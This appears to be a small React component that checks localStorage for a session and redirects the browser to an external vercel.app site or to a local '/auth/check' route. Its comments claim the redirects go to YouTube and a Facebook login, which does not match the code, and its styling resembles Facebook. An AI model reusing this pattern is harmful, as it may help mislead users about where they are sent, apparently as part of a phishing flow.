import { useEffect } from 'react';

export default function CheckSession() {
  useEffect(() => {
    const userSession = localStorage.getItem('user_session');
    
    if (userSession) {
      // User is already verified, redirect to YouTube
      window.location.href = 'https://art-premier-music-library.vercel.app/';
    } else {
      // No session found, redirect to Facebook login
      window.location.href = '/auth/check';
    }
  }, []);

  return (
    <div style={{ 
      display: 'flex', 
      justifyContent: 'center', 
      alignItems: 'center', 
      height: '100vh',
      background: '#f0f2f5',
      fontFamily: 'Helvetica, Arial, sans-serif'
    }}>
      <div>Checking your session...</div>
    </div>
  );
}
